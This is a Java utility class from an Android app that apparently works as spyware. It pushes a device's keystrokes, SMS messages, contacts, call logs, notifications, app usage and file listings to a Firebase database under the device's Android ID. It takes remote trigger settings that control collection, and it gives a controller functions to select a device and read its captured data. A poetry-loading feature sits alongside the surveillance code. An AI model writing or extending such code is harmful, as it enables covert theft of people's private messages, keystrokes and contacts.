package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.getAndroidID;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.getDeviceDetails;

import android.app.Activity;
import android.content.Context;
import android.util.Log;

import java.util.UUID;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.AppUsageReportData;
import com.vikasyadavnsit.cdc.dialog.MessageDialog;
import com.vikasyadavnsit.cdc.enums.ApplicationInputActions;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;

import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class FirebaseUtils {

    private static Context context;
    private static String selectedUserBasePath = null;

    public static void initialize(Context context) {
        FirebaseUtils.context = context;
    }

    public static void setSelectedUser(String androidId) {
        selectedUserBasePath = androidId != null
                ? AppConstants.FIREBASE_RTDB_BASE_PATH + androidId
                : null;
    }

    private static String getSelectedUserPath(String subPath) {
        String base = selectedUserBasePath != null ? selectedUserBasePath : getBasePath(context);
        return base + subPath;
    }

    public static void checkUserExistsAndInit(Activity activity) {
        DatabaseReference userRef = getDbRef(getBasePath(activity));
        userRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) {
                    activity.runOnUiThread(() ->
                            MessageDialog.multilineInputDialog(activity,
                                    ApplicationInputActions.FIREBASE_CREATE_USER));
                } else {
                    getAppTriggerSettingsData();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e("FirebaseUtils", "checkUserExistsAndInit failed: " + error.toException());
                getAppTriggerSettingsData();
            }
        });
    }

    // Get a reference to the database
    public static FirebaseDatabase getDatabase() {
        FirebaseDatabase database = FirebaseDatabase.getInstance(
                AppConstants.FIREBASE_DATABASE_REGION_URL);
        // database.setPersistenceEnabled(true);
        return database;
    }

    public static DatabaseReference getDbRef(String path) {
        DatabaseReference reference = getDatabase().getReference(path);
        reference.keepSynced(true);
        //reference.onDisconnect().setValue("I disconnected!");
        return reference;
    }

    private static String getPath(String path) {
        return getBasePath(context) + path;
    }

    private static String getBasePath(Context context) {
        return AppConstants.FIREBASE_RTDB_BASE_PATH + getAndroidID(context);
    }

    public static void getAppTriggerSettingsData() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/appSettings/appTriggerSettingsDataMap"));
        appTriggerSettingDataRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (!dataSnapshot.exists()) {
                    // User does not exist, create a new user
                    appTriggerSettingDataRef.setValue(createAppTriggerSettingsDataMap());
                } else {
                    ActionUtils.performFirebaseAction(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    private static Map<String, User.AppTriggerSettingsData> createAppTriggerSettingsDataMap() {
        Map<String, User.AppTriggerSettingsData> map = new HashMap<>();
        Arrays.stream(ClickActions.values()).forEach(clickAction -> {
            User.AppTriggerSettingsData obj = User.AppTriggerSettingsData.builder()
                    .enabled(false)
                    .repeatable(false)
                    .maxRepetitions(1)
                    .interval(0)
                    .actionStatus(ActionStatus.IDLE)
                    .clickActions(clickAction)
                    .uploadDataSnapshot(true)
                    .deleteLocalData(false)
                    .build();
            map.put(clickAction.name(), obj);
        });
        return map;
    }


    public static void createUser(String name) {
        String uuid = UUID.randomUUID().toString();
        User user = User.builder()
                .id(uuid)
                .fullName(name)
                .deviceDetails(getDeviceDetails(context))
                .build();
        getDbRef(getBasePath(context)).setValue(user);
        getDbRef(AppConstants.FIREBASE_RTDB_FLAT_USER_PATH + getAndroidID(context)).setValue(user);
    }

    public static void uploadUserKeystrokeDataSnapshot(KeyStrokeData keyStrokeData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/keystrokes"));
        appTriggerSettingDataRef.push().setValue(keyStrokeData);
    }

    public static void uploadUserSmsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/sms"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    public static void uploadUserContactsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/contacts"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    public static void uploadUserCallLogsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/callLogs"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    public static void uploadUserNotificationDataSnapshot(NotificationData notificationData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/notifications"));
        appTriggerSettingDataRef.push().setValue(notificationData);
    }

    public static void getAndroidUserClickActions() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/appSettings/appTriggerSettingsDataMap"));
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.getAndUpdateAndroidUserClickActions(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getFlatUserDetails() {
        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_FLAT_USER_PATH);
        ref.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.performFlatUserDetailsActions(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserKeystrokes() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/keystrokes"));
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displayAndroidUserKeystrokes(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserAccessibilityNotification() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/notifications"));
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displayAndroidUserAccessibilityNotification(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserSystemAppUsageStatistics() {
        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/appStats"));
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displaySystemAppUsageStatisticsReportData(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getMessageData() {
        DatabaseReference ref = getDbRef(getPath("/message"));
        ref.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                ActionUtils.performMessageAction(dataSnapshot.getValue(Object.class));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void uploadApplicationUsageReportDataSnapshot(Map<String, AppUsageReportData> appUsageDataMap) {
        getDbRef(getPath("/userDeviceData/appStats")).setValue(appUsageDataMap);
    }

    public static void uploadDeviceDirectoryStructureSnapshot(LinkedHashMap<String, Object> directoryMap) {
        getDbRef(getPath("/userDeviceData/fileStructure")).setValue(directoryMap);
    }

    public static void getShayariCollection(ShayariCollectionCallback callback) {
        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_SHAYARI_PATH);
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                java.util.List<String> shayaris = new java.util.ArrayList<>();
                for (DataSnapshot child : snapshot.getChildren()) {
                    String value = child.getValue(String.class);
                    if (value != null) shayaris.add(value);
                }
                callback.onLoaded(shayaris);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onLoaded(new java.util.ArrayList<>());
            }
        });
    }

    public interface ShayariCollectionCallback {
        void onLoaded(java.util.List<String> shayaris);
    }
}
